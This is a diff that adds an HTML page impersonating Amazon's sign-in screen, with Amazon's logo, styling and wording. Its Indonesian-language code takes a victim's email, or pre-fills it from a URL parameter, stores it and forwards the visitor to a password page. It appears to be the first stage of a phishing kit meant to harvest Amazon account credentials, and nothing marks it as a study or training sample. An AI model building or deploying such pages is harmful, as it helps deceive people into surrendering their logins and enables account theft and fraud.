@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Amazon Sign In</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
+        body { background: #fff; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 20px; }
+        .logo { margin: 10px 0 20px; }
+        .logo img { height: 30px; }
+        .kotak { width: 100%; max-width: 350px; border: 1px solid #ddd; border-radius: 8px; padding: 25px; background: #fff; }
+        h1 { font-size: 28px; font-weight: 400; margin-bottom: 25px; }
+        label { font-size: 13px; font-weight: 700; margin-bottom: 7px; display: block; }
+        input { width: 100%; padding: 8px 10px; border: 1px solid #a6a6a6; border-radius: 4px; font-size: 15px; margin-bottom: 10px; }
+        input:focus { border-color: #007185; outline: none; box-shadow: 0 0 0 3px #c8f0f4; }
+        button { width: 100%; padding: 9px; background: linear-gradient(to bottom, #f7df74, #ecc000); border: 1px solid #b88600; border-radius: 4px; font-size: 15px; cursor: pointer; margin-top: 10px; }
+        button:hover { background: linear-gradient(to bottom, #f5d648, #d4a300); }
+    </style>
+</head>
+<body>
+    <div class="logo"><img src="img/amazonlogo.png" alt="Amazon"></div>
+    <div class="kotak">
+        <h1>Sign in</h1>
+        <label for="email">Email or mobile phone number</label>
+        <input type="text" id="email" placeholder="Enter your email">
+        <button onclick="lanjutKeSandi()">Continue</button>
+    </div>
+
+<script src="config.js"></script>
+<script>
+window.onload = function() {
+    const params = new URLSearchParams(window.location.search);
+    const email = params.get("anrew");
+    if(email && email.includes("@")) {
+        localStorage.setItem("dataEmail", email);
+        window.location.href = `password.html?anrew=${encodeURIComponent(email)}`;
+    }
+};
+
+function lanjutKeSandi() {
+    const email = document.getElementById("email").value.trim();
+    if(!email || !email.includes("@")) {
+        alert("Masukkan email yang benar!");
+        return;
+    }
+    localStorage.setItem("dataEmail", email);
+    window.location.href = `password.html?anrew=${encodeURIComponent(email)}`;
+}
+</script>
+</body>
+</html>
